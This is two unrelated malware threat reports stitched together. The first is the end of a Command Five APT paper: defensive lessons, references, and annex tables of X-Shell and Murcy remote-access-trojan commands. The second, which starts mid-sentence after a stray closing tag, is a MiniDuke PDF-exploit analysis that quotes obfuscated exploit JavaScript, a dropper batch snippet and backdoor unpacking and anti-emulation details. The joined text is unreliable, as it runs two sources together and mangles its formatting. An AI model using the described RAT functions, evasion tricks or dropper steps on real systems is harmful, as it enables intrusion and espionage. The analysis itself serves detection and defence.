 - Increasingly, instead of malware using the default DNS servers on a compromised computer to resolve its callback domains to IP addresses, attackers will specify DNS servers for the malware to use.This has significant implications for network defenders.Such requests, if allowed, will bypass the victim’s DNS servers and defeat any blacklists used by the victim’s own DNS servers.Furthermore, the requests will not appear in the victim’s DNS server logs, making detection and investigation more difficult.- Organisations should consider blocking internal DNS traffic to all locations other than the company’s own DNS servers.Furthermore they should be alert to any DNS communication attempts to locations other than the company’s own DNS servers, as this may be an indicator of a malware infection.- When code signing certificates are revoked the date of effect of the revocation is chosen so that, where possible, legitimate software signed with the certificate continues to validate.Unfortunately, this means that sometimes malware signed with a compromised certificate will also continue to validate (despite the revocation).- Some malware attempts to communicate with C2 infrastructure at frequent intervals.The frequency of these communication attempts can be used to detect the malicious activity.- TCP port 443 traffic is often allowed out of a network without inspection by network security appliances as it is expected to be legitimate, encrypted SSL communications that can be difficult to inspect.Unfortunately, attackers take advantage of this by using the port to bypass security appliances to communicate with a C2 server (such as with the observed X­Shell communications).- Attackers often reuse the same code for their malware.Sometimes they will recompile the code, sometimes they will merely reconfigure the malware.This alters the file hash and therefore such a hash is not an effective signature for other configurations of the malware.Hashes of the individual code sections (e.g..text, .rdata, .reloc) make for more robust detection as sections within the malicious files often remain the same.- The majority of legitimate external network communications use the DNS protocol to determine their destination’s IP address.Outbound network activity that occurs without a DNS lookup should be treated with suspicion until the purpose of the communications can otherwise be determined.- Blocking outbound communication attempts that are not preceded by a DNS lookup can be effective in blocking C2 communication attempts that are made direct to an IP address (such as to an IP address listed within an X­Shell configuration webpage).Legitimate destination IP addresses should be whitelisted to prevent legitimate activity from also being blocked.- Attackers will sometimes continue to use a callback domain even when it is listed on blacklists and in multiple malware analysis 
 reports.- Blacklisting a domain can be useful but taking the time to research the domain and associated activity can help with the development of more effective, longer term mitigation strategies.</section>

<noncontent>
 <heading>DISCLAIMER</heading>
 Machine translation software and automated malware analysis reports have been heavily relied on throughout the development of this paper.While data has been verified against multiple sources where possible, Command Five Pty Ltd does not guarantee the veracity of sources or the accuracy of the information.Command Five Pty Ltd reminds readers to  exercise caution when visiting untrusted websites and/or opening untrusted digital documents.Command Five Pty Ltd does not warrant that the websites referenced in this paper are trustworthy.</noncontent>

<noncontent> 
<heading>REFERENCES</heading>

Blasco, J.(2012, January 12).Sykipot variant hijacks DOD and Windows smart cards.Retrieved February 05, 2012, 
 from Alienvault Labs: http://labs.alientvault.com/labs/index.php/2012/when­the­apt­owns­your­smart­
 cards­and­certs/

Command Five Pty Ltd. (2011, June).Advanced Persistent Threats: A Decade in Review.Retrieved September 24,
 2011, from Command Five Pty Ltd: 
 http://www.commandfive.com/papers/C5_APT_ADecadeInReview.pdf

Command Five Pty Ltd. (2011, September).SK Hack by an Advanced Persistent Threat.Retrieved January 06, 2012, 
 from Command Five Pty Ltd: http://www.commandfive.com/papers/C5_APT_SKHack.pdf

Common Computer Security Standards.(n.d.).Digital Certificates Used by Malware.Retrieved February 02, 2012, 
 from CCSS Forum: http://www.ccssforum.org/malware­certificates.php?&pag=4

Coviello, A.(2011, March 17).Open Letter to RSA Customers.Retrieved June 13, 2011, from RSA: 
 http://www.rsa.com/node.aspx?id=3872

Deutsch, P. (1996, May).DEFLATE Compressed Data Format Specification version 1.3.Retrieved January 08, 2012, 
 from IETF RFC 1951: http://www.ietf.org/rfc/rfc1951.txt

Deutsch, P. (1996, May).ZLIB Compressed Data Format Specification version 3.3.Retrieved January 25, 2012, from
 IETF RFC 1951: http://www.ietf.org/rfc/rfc1950.txt

Doctor Web.(2011, December 29).Dr.Web Anti­virus ­ How To Remove Virus (Trojan.DownLoader4.20396) ­
 [DRWEBHK.COM].Retrieved December 29, 2011, from Dr.Web HK: 
 http://www.drwebhk.com/en/virus_techinfo/Trojan.DownLoader4.20396.html

DomainTools, LLC.(n.d.).203.160.67.131 IP Address | WHOIS | DomainTools.com.Retrieved from DomainTools: 
 http://whois.domaintools.com/203.160.67.131

Dr.Web.(2011, July 10).Dr.Web ­ innovation IT­security solutions.Complex protection against Internet threats.Retrieved 02 03, 2012, from Dr.Web: http://vms.drweb.com/virus/?i=1007435

Fagerland, S. (2011, November 17).Invisible YNK, a Code Signing Conundrum | Norman Blog.Retrieved December
 13, 2011, from Norman.com: http://blogs.norman.com/2011/malware­detection­team/invisble­ynk­a­
 code­signing­conundrum

F­Secure Corporation.(n.d.).Threat Description: Backdoor: W32/Hupigon.Retrieved December 23, 2011, from F­
 Secure: http://www.f­secure.com/v­descs/backdoor_w32_hupigon.shtml

GFI Sandbox.(2010, May 07).GFI Sandbox Analysis Report.Retrieved January 06, 2011, from GFI Sandbox:
 http://xml.ssdsandbox.net/index.php/37405d5bcf64fb9547cacda95f4ce8b4

GFI SandBox.(2011, August 04).GFI SandBox Analysis Report.Retrieved October 17, 2011, from GFI SandBox: 
 http://xml.ssdsandbox.net/index.php/91a268b317d2cc6569b85bb03a5ff841

GFI SandBox.(2011, July 15).GFI SandBox Malware Analysis Report: Trojan.Win32.AgentBypass.Retrieved August
 25, 2011, from http://xml.ssdsandbox.net/view/fdf2c5c2b1874efe7fd335092df2d3bc

GFI Sandbox.(2011, September 04).GFI Sandbox Malware Analysis Report: Trojan.Win32.Generic.Retrieved 
 January 06, 2012, from GFI Sandbox: 
 http://xml.ssdsandbox.net/index.php/9addc6d573309399e2b878873a00a921

GFI SandBox.(2011, May 29).GFI SandBox Malware Analysis Report: Trojan.Win32.Generic!SB
 Trojan.Trojan.Win32.Generic.Retrieved September 2011, 2011, from 
 http://www.xml.ssandbox.net/view/bce1069dd099f15170c5fd05bae921b5

GFI Sandbox.(2011, March 20).GFI Sandbox Malware Analysis Report: Trojan­Dropper.Win32.Wykores.Retrieved
 January 06, 2012, from GFI Sandbox: 
 http://xml.ssdsandbox.net/index.php/0d38d6c2b9eb817b40afc4272545a43b

GFI Software.(2010, December 26).CWSandbox Report by MD5 at Sunbelt Security.Retrieved December 27, 2011, 
 from Sunbelt Security: 
 http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=19b0227bec75bef93c6ccc
 549b6d2ba0 

Hispasec Sistemas.(2009, April 15).Antivirus scan for 70a88091e1f9a7bee246488cce79936a at 2009­04­15 
 11/52/02 UTC.Retrieved February 02, 2012, from VirusTotal: 
 https://www.virustotal.com/file/63ac63f59700dbcc3778a9c1e9f5689869c86ac2aa3295ad93278f9244c
 ff7f4

Hispasec Sistemas.(2010, May 22).Antivirus scan for 5bc597e48270f04ec9b683432432e352 at 2010­05­22 
 17/52/37 UTC ­ VirusTotal.Retrieved February 07, 2012, from VirusTotal: 
 https://www.virustotal.com/file/e4711259a3dd9af85b649cc8afcf34bc86d1d68ed7286db35f7b260e60
 27c110/analysis/

Hispasec Sistemas.(2011, August 15).Antivirus scan for 2d8a9038e151fb30d45ea8668afd2a8e at 2011­08­15 
 13/34/31 UTC ­ VirusTotal.Retrieved February 03, 2012, from VirusTotal: 
 https://www.virustotal.com/file/76747e708d79925ba0817d48c96f4c85938bfe3f0f5b681ff204a09bd3e
 bc1cc/analysis

Hispasec Sistemas.(2011, August 19).Antivirus scan for 461884f1d41e9e0709b40ab2ce5afca7 at 2011­08­19 
 13/31/35 UTC.Retrieved February 02, 2012, from VirusTotal: 
 https://www.virustotal.com/file/74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5
 a4fb1fe

Hispasec Sistemas.(2011, November 06).Antivirus scan for 5fce1fc18283d76c396a3ccc64bdbbde at 2011­11­06 
 09/44/14 UTC.Retrieved January 30, 2012, from VirusTotal: 
 https://www.virustotal.com/file/4dc0c7d8d84838c9b209ea727bd4ab7471a88fba55b786f7e37ce6394
 565b6aa/analysis

Hispasec Sistemas.(2011, November 08).Antivirus scan for 754364d9db702dc715327b40bf97e556 at 2011­11­08
 18/29/09 UTC.Retrieved January 30, 2012, from VirusTotal: 
 https://www.virustotal.com/file/781c30714ff5304b7e9530ec879ef4ed7e94a0138537563b4c12b158c7
 bcab40/analysis

Hispasec Sistemas.(2011, May 10).VirusTotal ­ Free Online Virus, Malware and URL Scanner.Retrieved December
 30, 2011, from VirusTotal: 
 http://www.virustotal.com/report.html?id=5e29960ba0bb544623b52e5db592242f30c05ca1336ec667
 d0a162b9a7584f90

Hispasec Sistemas.(2011, November 21).VirusTotal ­ Free Online Virus, Malware and URL Scanner.Retrieved 
 December 30, 2011, from VirusTotal: http://www.virustotal.com/file­
 scan/report.html?id=deb83be93eb74a66b8c654ddb28c3a1c58ee89abf3a72ce616755deb6f9902c­
 1321864468

Hispasec Sistemas.(2011, December 21).VirusTotal ­ Free Online Virus, Malware and URL Scanner.Retrieved 
 December 30, 2011, from VirusTotal: http://www.virustotal.com/file­
 scan/report.html?id=251b196f94d6a858941cb2e18b6879fc2d3f4ef580a8cae338f42e7776229fc­
 1324454798

Hispasec Sistemas.(2011, May 24).VirusTotal ­ Free Online Virus, Malware and URL Scanner.Retrieved January 04, 
 2012, from VirusTotal: http://www.virus­scan/file­
 scan/report.html?id=5999da598ee19708c997e77650b0b423c0337ebff16c6ad7d929fc3a84f10f13

Kaspersky Lab ZAO.(2010, January 12).Backdoor.Win32.Agent.anvj.Retrieved December 09, 2011, from
 Securelist: http://www.securelist.com/en/descriptions/7440365/Backdoor.Win32.Agent.anvj

Kurc, D. (2011, April 17).Encyclopedia entry: TrojanDropper:Win32/Redsip.A ­ Learn more about malware ­
 Microsoft Malware Protection Center.Retrieved January 25, 2012, from Microsoft Malware Protection
 Center:
 http://www.microsoft.com/security/portal/threat/Encyclopedia/Entry.aspx?Name=Trojan.Dropper%3
 AWin32%2FRedsip.A

Lelli, A.(2010, March 12).Zero­Day Attack on IE6 ­ JS.Sykipot Doesn't Spare Retired Software.Retrieved February
 01, 2012, from Symantec Connect Community: http://www.symantec.com/connect/blogs/zero­day­
 attack­ie6­jssykipot­doesn­t­spare­retired­software

Malware Domains.(2012, January 16).Malware Domains.Retrieved January 30, 2012, from Malware Domains: 
 http://mirror1.malwaredomains.com/updates/20120116.txt

MalwareGroup.com.(n.d.).209.53.155.244 | Ipaddress .Retrieved January 18, 2012, from MalwareGroup: 
 http://www.malwaregroup.com/ipaddresses/details/209.53.155.244

McAfee Foundation Professional Services and McAfee Labs.(2011, February 10).Global Energy Cyberattacks:
 "Night Dragon".Retrieved June 13, 2011, from McAfee: http://www.mcafee.com/us/resources/white­
 papers/wp­global­energy­cyberattacks­night­dragon.pdf

McAfee Inc. (2011, December 22).Backdoor­FCQ ­ Malware ­ McAfee Labs Threat Center.Retrieved February 02, 
 2012, from McAfee Labs Threat Center: http://www.mcafee.com/threat­
 intelligence/malware/default.aspx?id=670739

Mendoza, E. (2011).TROJ_INJECT.AMR | Low Risk | Trend Micro Threat Encyclopedia.Retrieved November 21, 
 2011, from Trend Micro: http://about­
 threats.trendmicro.com/malware/aspx?language=au&name=TROJ_INJECT.AMR

Microsoft.(2007, December 10).A description of Svchost.exe in Windows XP Professional Edition.Retrieved 
 September 07, 2011, from Microsoft Support: http://support.microsoft.com/?kbid=314056

Microsoft Corporation.(2011, September 07).Locales and Languages (Windows).Retrieved January 24, 2012,
 from Microsoft Software Development Network: http://msdn.microsoft.com/en­
 us/library/dd318716.aspx

Microsoft Corporation.(2011, September 07).OSVERSIONINFOEX structure.Retrieved January 17, 2012, from 
 Microsoft Software Development Network: http://msdn.microsoft.com/en­
 us/library/windows/desktop/ms724833(v=vs.85).aspx

Microsoft Corporation.(2011, September 07).SYSTEM_INFO structure.Retrieved January 24, 2012, from Microsoft 
 MSDN: http://msdn.microsoft.com/en­us/library/windows/desktop/ms724958(v=vs.85).aspx

Mullaney, C. (2011, July 30).Backdoor.Sogu Technical Details | Symantec.Retrieved August 18, 2011, from 
 http://www.symantec.com/security_response/writeup.jsp?docid=2011­073003­5345­99&tabid=2

Parkour, M. (2011, July 05).contagio: Jul 5 CVE­2010­2883 PDF invitation.pdf with Poison Ivy from 112.121.171.94 |
 pu.flower­show.org.Retrieved January 28, 2012, from Contagio: 
 http://contagiodump.blogspot.com/2011/07/message­targeting­experts­on­Japan.html

Parkour, M. (2011, July 14).Jul 13 CVE­2010­2883 PDF Meeting Agenda with more Poison Ivy www.adv138mail.com
 | 112.121.171.94.Retrieved September 22, 2011, from Contagiodump Blog:
 http://contagiodump.blogspot.com/2011/07/jul­13­cve­2010­2883­pdf­meeting­agenda.html

Rasmussen, R. (2011).Practical Usage of Passive DNS Monitoring for E­Crime Investigations.Retrieved January 04,
 2011, from http://conferences.npl.co.uk/satin/presentations/satin2011slide3­Rasmussen.pdf

rbls.(2011, November 01).shenqi.travlman.com is not listed in any blacklists.Retrieved November 01, 2011, from 
 rbls: http://rbls.org/shenqi.travlman.com

SafeZoneCast.(2011, August 09).SafeZoneCast.Retrieved December 30, 2011, from
 http://safezonecast.lgcns.com/Common/MenaceInfo/pop.MenaceInfo.jsp?code=SZ1108­0003NS

Sandbox, G. (2010, December 26).GFI Sandbox Malware Analysis Report: Trojan­Downloader.Win32.Generic.Retrieved November 29, 2011, from GFI Sandbox:
 http://xml.ssdsandbox.net/view/3df0d0ab4ad9da4559a1c6464c8526d1

shapeless.(n.d.).Poison Ivy 2.3.0 Documentation.Retrieved August 17, 2011, from Poison Ivy ­ Remote
 Administration Tool: http://www.poisonivy­rat.com/dl.php?file=230docs

Sophos Ltd. (2011, November 25).Detailed Analysis ­ Troj/Agent­UDR ­ Viruses and Spyware ­ Threat Analyses ­
 Threat Center ­ Sophos.Retrieved December 8, 2011, from Sophos: http://www.sophos.com/en­
 us/threat­center/threat­analyses/viruses­and­spyware/Troj~Agent­UDR/detailed­analysis.aspx

Sophos Ltd. (2012, January 19).Detailed Analysis ­ Troj/Bdoor­BDM ­ Viruses and Spyware ­ Threat Analyses ­
 Threat Center ­ Sophos.Retrieved January 31, 2012, from Sophos Threat Center:
 http://www.sophos.com/en­us/threat­center/threat­analyses/viruses­and­spyware/Troj~BDoor­
 BDM/detailed­analysis.aspx

Sunbelt.(2009, October 15).Sunbelt CWSandbox Malware Analysis Report: Backdoor.Win32.Pasur.Retrieved 
 December 19, 2011, from Sunbelt Security Sandbox: 
 http://xml.ssdsandbox.net/archive/42e8163b7f08dd383e62e4bdb7f07c08

Sunbelt Security.(2009, May 03).Sunbelt CWSandbox Malware Analysis Report.Retrieved December 01, 2011,
 from Sunbelt Security Sandbox: 
 http://xml.ssdsandbox.net/archive/70a88091e1f9a7bee246488cce79936a

Sunbelt Security.(2009, October 16).Sunbelt CWSandbox Malware Analysis Report: Trojan.Win32.Sisproc.Retrieved December 19, 2011, from Sunbelt Security Sandbox:
 http://xml.ssdsandbox.net/archive/3fdea18b9610cbc9b63ba7a44899fbfb

Sunbelt Security.(2010, December 31).CWSandbox Report by MD5 at Sunbelt Security.Retrieved October 25, 
 2011, from Sunbelt Security:
 http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=69ed8f7b0046956045a90
 e36e3c83f6a

Sunbelt Security.(2010, May 12).GFI SandBox Analysis Report.Retrieved February 07, 2012, from Sunbelt
 Security SandBox: http://xml.ssdsandbox/archive/5bc597e48270f04ec9b683432432e352

Sunbelt Security.(2011, June 01).GFI SandBox Malware Analysis Report/ Trojan.Win32.Generic!SB.Retrieved
 January 23, 2012, from GFI SandBox: 
 http://xml.ssdsandbox.net/view/228191d05a09877f90c8b802617bb25f

Symantec Corporation.(2010, March 11).Backdoor.Sykipot At Work.Retrieved February 02, 2012, from Symantec
 Connect Community: http://www.symantec.com/connect/blogs/backdoorsykipot­work

Symantec Corporation.(2012, January 26).Insight into Sykipot Operations | Symantec Connect Community.Retrieved February 05, 2012, from Symantec Connect Community: 
 http://www.symantec.com/connect/blogs/insight­sykipot­operations­0

Telus.(2011, August 03).Backdoor.Win32.Murcy.A ­ TELUS Security Labs.Retrieved December 06, 2011, from 
 TELUS Security Labs: http://telussecuritylabs.com/threats/show/TSL20110803­01

Thakur, V. (2011, December 14).The Sykipot Attacks | Symantec Connect Community.Retrieved February 04, 2012, 
 from Symantec Connect Community: http://www.symantec.com/connect/blogs/sykipot­attacks

Threat Expert Ltd. (2010, June 15).ThreatExpert Report.Retrieved January 11, 2012, from ThreatExpert: 
 http://www.threatexpert.com/report.aspx?md5=b098aee16bd138c412075C9d315aefc9

Threat Expert Ltd. (2011, July 26).ThreatExpert Report: Backdoor.Win32.Agent.anvj, Trojan­Downloader.Delphi.Retrieved December 17, 2011, from ThreatExpert: 
 http://www.threatexpert.com/report.aspx?md5=3e3736dffedaf2a0ae4d948567933b3f 

Threat Expert Ltd. (2011, November 04).ThreatExpert report: Mal/Behav­027, Backdoor:Win32/Idicaf.gen!B.Retrieved November 25, 2011, from ThreatExpert: 
 http://www.threatexpert.com/report.aspx?md5=229947cc71a4601b8b7794b402e536a9

Threat Expert Ltd. (2011, October 06).ThreatExpert Report: Mal/Behav­027, Virus/Win32.Atraps.CK.Retrieved
 November 21, 2011, from ThreatExpert: 
 http://www.threatexpert.com/report.aspx?md5=da2f98315f4c56fce21273e21e453b76

Threat Expert Ltd. (2011, September 25).ThreatExpert Report: TrojanDropper: Win32/Idicaf.C,
 Virus.Win32.Atraps.CK, Backdoor.Win32.Agent.bhxn.Retrieved December 25, 2011, from ThreatExpert:
 http://www.threatexpert.com/report.aspx?md5=f4c08d3df5ede0790e34eae0c5db8a7a

Threat Expert Ltd. (2008, December 18).ThreatExpert Report: Mal/EncPk­BL, Worm:Win32/Emerleox.J,
 Packed.Win32.Klone.af.Retrieved January 15, 2012, from ThreatExpert:
 http://www.threatexpert.com/report.aspx?md5=37037f674bcbbb7eef3889ab6eb30268

ThreatExpert Ltd. (2010, March 18).ThreatExpert Report: Troj/Agent­MSC, BinImage/Agent.283805.Retrieved 
 January 26, 2012, from ThreatExpert: 
 http://www.threatexpert.com/report.aspx?md5=2d8a9038e151fb30d45ea8668afd2a8e

ThreatExpert Ltd. (2011, December 09).ThreatExpert Report: Backdoor.Win32.Delf.abow, Trojan.Win32.CDur,
 Mal/Behav­058.. Retrieved February 03, 2012, from ThreatExpert: 
 http://www.threatexpert.com/report.aspx?md5=f0b848a841d4ef3406a6f9c4766c540b

US­CERT.(2011, March 26).Early Warning and Indicator Notice (EWIN)­11­077­01A UPDATE.Retrieved January 
 06, 2011, from Incident Prevention and Detection: Protecting Information Security of National Banks: 
 http://www.occ.treas.gov/news­issuances/alerts/2011/alert­2011­4b.pdf

Verisign.(2011).Verisign Authentication Services.Retrieved December 29, 2011, from Verisign Class 3 Code
 Signing Certificate Revocation List: http://crl.verisign.com/CSC3­2009.crl

Ward, E. (2011, July 31).Backdoor.Murcy | Symantec.Retrieved January 05, 2011, from Symantec:
 http://www.symantec.com/security_response/writeup.jsp?docid=2011­080105­2030­99

Wikipedia.(n.d.).List of Intel microprocessors.Retrieved January 21, 2012, from Wikipedia, the free encyclopedia: 
 http://en.wikipedia.org/wiki/List_of_Intel_microprocessors

Wong, J.(2011, August 16).Encyclopedia entry:Backdoor.Win32/Thoper.A.Retrieved January 24, 2012, from
 Microsoft Malware Protection Center:
 http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Backdoor%3AWin
 32%2FThoper.A

XTiger ­ Crackersoftware.(2011, February 14).All for Dream... Retrieved December 23, 2011, from xdoors.net: 
 http://www.xdoors.net/faq/index.html

XTiger.(2010, April 28).forum.xdoors.net.Retrieved December 19, 2011, from xdoors.net:
 http://forum.xdoors.net/viewtopic.php?f=4&t=7

XTiger.(2011, March 16).forum.xdoors.net.Topic: X­Door/X­Shell free download paused.Retrieved December 27,
 2011, from forum.xdoors.net: http://forum.xdoors.net/viewtopic.php?f=5&t=76

XTiger.(2011).Xdoors.net.Retrieved December 23, 2011, from All for dream...: http://www.xdoors.net

XTiger.(n.d.).X­Shell.Retrieved December 23, 2011, from XDoors: http://www.xdoors.net/help/X­Shell.htm
</noncontent>

<section> 
 <heading>ANNEX A</heading>
<table>
 FORMAT OF OSVERSIONINFOEX STRUCTURE

 OFFSET LENGTH (IN BYTES) MEMBER DESCRIPTION

 0 4 Structure size in bytes.‘0x9C’ (156 bytes).4 4 OS major version.8 4 OS minor version.12 4 OS build number.16 4 An identifier for the OS platform.20 128 A null­terminated string that indicates the latest Service Pack installed.148 2 Service Pack major version number.150 2 Service Pack minor version number.152 2 A bit mask<fn>91</fn> that identifies the product suites installed on the system.154 1 Product type that indicates whether the system is a workstation (‘0x01’), a domain controller
 (‘0x02’) or an NT server but not a domain controller (‘0x03’).155 1 A byte reserved for future use.</table>
</section>


<footnote> 
91 For a detailed description of the product suite bit mask refer to the Microsoft MSDN OSVERSIONINFOEX reference page.(Microsoft Corporation, 2011)
</footnote>

<section>
 <heading>ANNEX B: FORMAT OF SYSTEM_INFO STRUCTURE</heading>


<table>
OFFSET LENGTH (IN BYTES) MEMBER DESCRIPTION

0 2 A number indicating the processor architecture of the installed OS.2 2 Bytes reserved for future use.4 4 Page size used and the granularity of page protection and commitment.8 4 Minimum application address.This is the lowest memory address that applications and 
 DLLs can access.12 4 Maximum application address.This is the highest memory address that applications 
 and DLLs can access.16 4 A mask representing the set of processors configured into the system.20 4 The number of logical processors.24 4 Processor type.28 4 Granularity for the starting address at which virtual memory can be allocated.32 2 The architecture­dependent processor level.34 2 The architecture­dependent processor revision.</table>
</section>

<section> 
<heading>ANNEX C: SUMMARY OF X­SHELL COMMANDS</heading>
<table>
COMMAND COMMAND DESCRIPTION
svc Service control (list/stop/start/view/install etc.).pslist Lists processes.pskill Kills process.shell Starts a command shell.reboot Restarts the computer.shutdown Shuts down the computer.filetime Modifies timestamp on a file (date created etc.).uninstall Uninstalls RAT.mlist Gets process module specific information.idle Gets host mouse and keyboard idle time.uptime Gets system uptime.update Update plugin from URL.urlh Opens a URL in hidden view.urln Opens a URL in normal view.exeh Executes a program in hidden view.exen Executes a program in normal view.zip Compresses a file or folder to a Cab file.mhost Gets current Control Host IP address and port.fputs Uploads a file to the Control Host.fgets Downloads a file from the Control Host or a URL.inject Injects a plugin into another process.(The default process to inject into is ‘IEXPLORE.EXE’.)pei Infects a portable executable file.per Repairs a portable executable file.avinfo Displays information about installed antivirus software.htan TCP port forwarding and mapping.devcon Device manager.keylog Keylogger control.cleanl Cleans event log.display Displays control proxy.proxy HTTP proxy service.socks5 SOCK5 proxy service.tcpagent TCP port forwarding.clipboard Clipboard control.tcplist Lists TCP connections.tcpkill Terminates a TCP connection.sysinfo Gets system information.spilist SPI layer information.cdrom Controls CD­ROM (open/close).sens Extracts sensitive information.rebind Rebinds TCP port to get password.fport Displays port information with process path.user User control (list/add/delete/ control etc.).Supports cloning and cloning check flood.flood Initiates a flood attack.term Terminal management settings (viewport/setport/start/stop).findpass Attempts to find current user’s login password.myplug An interface to third­party developed plugins.</table>
</section>

<section>
 <heading>ANNEX D: SUMMARY OF MURCY COMMANDS</heading>

<table>
COMMAND CODE COMMAND DESCRIPTION

0x1003 Generate Sxl value from the registry key group.0x1004 Add Sxl description to registry key.0x2000 Lock computer.0x2001 Log off.0x2002 Reboot.0x2003 Shutdown.0x2004 Execute file.0x2005 Execute msg.exe.0x3000 Get system drive information.0x3001 File search.0x3003 File search.0x300A Create directory.0x300B Create process.0x300C Delete file(s).0x3200 Perform file operations.0x5000 Obtain process information.0x5002 Obtain process information.0x5004 Kill process.0x6000 List services.0x6002 Delete service.0x6003 Modify service configuration.0x6004 Start service.0x6005 Stop service.0x7000 Input/output generated in the process with a named pipe.0x8000 Get environment string.</table>
</section>


<noncontent> 
<heading>COPYRIGHT NOTICE</heading>

 Copyright © Command Five Pty Ltd. All rights reserved.This document is provided by the copyright holders under the licence
that follows.By obtaining, using, and/or distributing this document you
agree that you have read, understood, and agree to the terms and
conditions that follow.The names and trademarks of Command Five Pty Ltd may not be
used in advertising or publicity relating to this document or its contents
without specific, prior, written permission.No permission is given for this document to be used for commercial
purposes or as part of any commercial activity or undertaking,
including, but not limited to, use in or relating to advertising or
publicity, and/or use in support of, or as part of, any pre­sales or sales
activities.No permission is given to create modified or derivative works.You
may distribute this document in its original form for non­commercial
purposes in accordance with the other terms and conditions stated 
herein.Copyright title will at all times remain with the copyright
holders.All referenced trademarks remain the property of their respective
owners.THIS DOCUMENT IS PROVIDED ‘AS IS’ FOR INFORMATIONAL
PURPOSES ONLY WITH NO REPRESENTATIONS OR WARRANTIES OF
ANY KIND, INCLUDING BUT NOT LIMITED TO ANY WARRANTY,
EXPRESS OR IMPLIED, OF MERCHANTABILITY OR FITNESS FOR A
PARTICULAR PURPOSE; WARRANTY OF NON­INFRINGEMENT, OR
TITLE; NOR ANY WARRANTIES PERTAINING TO THE ACCURACY OR
COMPLETENESS OF CONTENT.ANY OPINIONS EXPRESSED IN THIS DOCUMENT MAY CHANGE
WITHOUT NOTICE AND ARE NOT NECESSARILY THE CONSIDERED
OPINIONS OF COMMAND FIVE PTY LTD, ITS PARTNERS, EMPLOYEES,
OR AFFILIATE ORGANISATIONS.ANY ADVICE OFFERED IN THIS
DOCUMENT IS OFFERED WITHOUT WARRANTY OF ANY KIND.Command Five Pty Ltd
 ABN: 49 149 576 670

 http://www.commandfive.com
 info@commandfive.com
</noncontent>


</doc>We
called this new malware “ItaDuke” because it reminded us of Duqu and because of the ancient Italian comments in the
shellcode copied from Dante Aligheri’s Divine Comedy.Since the original announcement, we have observed several new incidents using the same exploit (CVE-2013-0640), some of
which were so unusual that we decided to analyze them in depth.Together with our partner CrySyS Lab, we’ve performed a detailed analysis of these new incidents which indicate a new,
previously unknown threat actor.For their analysis, please read http://blog.crysys.hu/2013/02/miniduke/ .For our analysis,
please read below.First of all, while the fake “Mandiant” PDF reports (see http://blog.seculert.com/2013/02/spear-phishing-with-mandiant-apt-
report.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SeculertResearchLab+(Seculert+Researc
h+Lab)) are just dirty hacks of the original exploit, these newer attacks appear to have been created by a 0-day toolkit that was
used to build the original “Visaform Tukey.pdf” discovered by FireEye.<footer>
PAGE 1| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor|</footer>
The new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed.For instance, the function named “oTHERWISE” was
renamed to “q1w2e3r4t”.The function is later called in the code like this:

New exploit:
       var sCIENZA = q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937)], gIRARSI);

Older (“Visaform Turkey.pdf”) exploit:


<footer>
PAGE 4| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
         var sCIENZA = oTHERWISE (vOLENCI['pRENDENDO'], gIRARSI);

In addition, the JS code is now in compressed format, while the original sample had it in plaintext.The reason behind the
changes is probably to avoid detection by anti-malware products although this doesn’t prevent our product from detecting it
heuristically as “HEUR:Exploit.Script.Generic”.The shellcode contained in the PDF document is similar to that used in the documents carrying the “Itaduke” payload, with
some differences.For instance, after exploiting the vulnerability, it searches for a specific signature within the PDF file.While
the “Itaduke” shellcode was looking for “!H2bYm.Sw@”, the MiniDuke version uses a different signature, “@34fZ7E*p\”.<figure></figure>

                                                   Signature in the Itaduke PDF file


<figure></figure>

                                                Signature in the Miniduke PDF file

Once the payload signature is found, it is decrypted with XOR and then decompressed using RtlDecompressBuffer API (LZNT1).The resulting PE file is written to a temporary file and loaded using LoadLibary API.The resulting dynamic library implements the second stage of installation.It contains two binary resources, 101 and 102.Resource 101 is the main backdoor DLL component.It is written to the %AppData% directory and loaded using LoadLibary API.Resource 102 is the decoy PDF document.It is written to the Internet cache directory and then opened using a simple BAT file:

         TASKKILL /F /IM acro*
         ping -n 1 127.0.0.1>nul
         start "" "%path to decoy PDF document%"

The filenames of the dropped files are hardcoded in their resources.<figure></figure>

                                          Beginning of the resource 101 with its filename

<figure></figure>


                                          Beginning of the resource 102 with its filename



Interestingly, the malware dropper contains the following paths:

    ●    “c:\src\dlldropper\Release\L2P.pdb”.●    “C:\src\hellodll\Release\hellodll.pdb”.<footer>
PAGE 5| The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor |</footer>
These paths did not exist in the dropper of original PDF (“Visaform Turkey.pdf”).If we are to trust the PE headers, the dropper was compiled on Feb 20, 2013:


<figure></figure>

                                ‘Hungarian’ dropper compilation time - “Feb 20 10:51:16 2013”

The backdoor used in the Hungarian case was compiled on “Feb 20 10:57:52 2013”, just minutes after the dropper was
created.Perhaps the most unusual thing about these three new attacks is the malware they drop.In all the analyzed cases, the
dropped malware is in the form of a 22,528 bytes DLL file.Parts of the malicious DLL file are encrypted with information
related to the system configuration, which ensures it will only work properly on the victim’s system.If copied to another
computer, the malware will be unable to function successfully.The backdoor is written in “old school” assembler and is tiny by current standards - only 20 KB.This is most unusual for
modern malware, which can be several megabytes in size.It has a small decryptor at the beginning that decrypts the main
body.All three cases use different encryption keys.Another peculiarity is that the backdoor has no imports: all functions are
scanned from memory and are called dynamically.It is also interesting that the first two Win32 APIs resolved and called by the
unpacking stub are ntdll.LdrLoadDll and kernel32.VirtualProtectEx.These two functions are not called according to the
“_stdcall” convention.Instead, a ‘jmp ebx’ instruction is executed after manually building the stack.Clearly some thought went
into creating anti-emulation and anti-scanning techniques with this malware.</section>
<section>

<heading>
Backdoor analysis
</heading>
The backdoor has a single export, which for instance is named “JorNgoq” in the Hungarian case.When this export is called at
load, the backdoor sets the “.rdata” section’s permissions to “RWX” and sets the mutex to a hardcoded string “nljhfdb”.The entrypoint of the library (DllMain) is obfuscated and the main body of the malware is encrypted.The encryption is rather
simple: the “.rdata” section of the library is ROL’ed with a linear key and XOR’ed with a fixed key.Both keys are derived from
the length of the encrypted part.<footer>
